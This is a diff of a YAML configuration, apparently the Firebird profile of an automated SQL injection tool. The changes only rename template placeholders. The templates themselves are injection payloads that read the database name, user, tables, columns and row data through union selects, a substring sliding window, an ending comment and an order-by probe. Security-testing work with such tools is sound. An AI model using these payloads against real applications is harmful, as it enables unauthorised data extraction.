@@ -3,11 +3,11 @@ resource:
  info: |
   SELECT 
       rdb$get_context('SYSTEM', 'ENGINE_VERSION')
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || rdb$get_context('SYSTEM', 'DB_NAME')
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || rdb$get_context('SYSTEM', 'CURRENT_USER')
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
   from rdb$database
   
  schema: 
@@ -18,39 +18,39 @@ resource:
     * => use limit 1,1 instead
     */
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || rdb$get_context('SYSTEM', 'DB_NAME')
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from rdb$database
-   {limit}
+   ${limit}
    
   table: |
    SELECT 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || trim(rdb$relation_name)
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from rdb$relations
-   {limit}
+   ${limit}
    
   column: |
    SELECT 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || trim(rdb$field_name)
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from rdb$relation_fields
-   where rdb$relation_name = '${TABLE}'
-   {limit}
+   where rdb$relation_name = '${table}'
+   ${limit}
    
   row: 
    query: |
     SELECT 
-        '${ENCLOSE_VALUE_SQL}'
-        || ${FIELDS}
-        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
-    from ${TABLE}
-    {limit}
+        '${enclose_value_sql}'
+        || ${fields}
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+    from ${table}
+    ${limit}
    fields: 
-    field: trim(coalesce(${FIELD}, ''))
+    field: trim(coalesce(${field}, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -58,25 +58,25 @@ strategy:
   slidingWindow: |
    select
        /**
-        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
-       '${LEAD}'
+       '${lead}'
        || NULLIF(
            substring(
-               (${INJECTION})
-               from ${INDEX} 
+               (${injection})
+               from ${index} 
                for 65536
            ),
-           '${TRAIL_SQL}'
+           '${trail_sql}'
        )
        from RDB$DATABASE
-  limit: ROWS ${LIMIT} TO ${LIMIT}
-  failsafe: (1337${INDICE}7330%2b1)
+  limit: ROWS ${limit.value} TO ${limit.value}
+  failsafe: (1337${indice}7330%2b1)
   calibrator: |
    rpad(
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1024, 
-       '${CALIBRATOR_SQL}'
+       '${calibrator_sql}'
    )
   limitBoundary: 1
   endingComment: --+-
@@ -87,6 +87,6 @@ strategy:
     - Unexpected end of command - line
     
  normal: 
-  indices: union select ${INDICES} from RDB$DATABASE
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from RDB\$DATABASE)
+  indices: union select ${indices} from RDB$DATABASE
+  capacity: (select '${lead}${indice}' || ${calibrator} from RDB\$DATABASE)
   orderBy: order by 1337
